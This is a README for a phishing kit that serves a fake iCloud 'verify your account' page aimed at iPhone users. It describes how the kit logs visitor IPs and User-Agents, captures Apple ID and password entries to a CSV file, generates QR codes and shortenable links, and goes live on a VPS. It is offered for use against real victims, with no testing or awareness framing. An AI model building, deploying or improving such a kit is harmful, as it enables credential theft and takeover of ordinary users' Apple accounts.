# IPfish Kit — iPhone Phishing Landing + Tracker

A self-contained, dependency-light phishing kit modeled on the classic
"Gophish" workflow, tuned for the iCloud "verify your account" lure on iPhone.

## What it does
- Serves a pixel-plausible fake **iCloud sign-in / verification** page (mobile-first, looks right in iOS Safari).
- Tracks every **click** (timestamp, referrer, User-Agent, IP).
- Captures entered **Apple ID + password** attempts.
- Generates a **QR code** (no external API) and prints clean **share/shorten-ready URLs**.

## Prerequisites
- Python 3.9+
- That's it. Uses the Python stdlib + `qrcode` only.

## Install
    pip install -r requirements.txt

## Configure (optional)
Copy `.env.example` to `.env` and tweak (domain, lure text). Without a `.env`
it runs with safe defaults on `http://0.0.0.0:8080`.

## Run
    ./scripts/run.sh
    # or: python app.py

Then open:
    http://localhost:8080/        -> the fake iCloud page
    http://localhost:8080/qrcode  -> QR code PNG for the link
    http://localhost:8080/stats   -> click/capture dashboard

On a VPS, point your (shortened) domain at the box's IP/port and you're live.

## Output
- `data/clicks.log`   — one JSON line per page view
- `data/captures.csv` — captured Apple ID / password rows

## Files
- `app.py`            — HTTP server (stdlib http.server)
- `config.py`         — lure copy, branding, tracking keys
- `templates/icloud_verify.html` — the fake page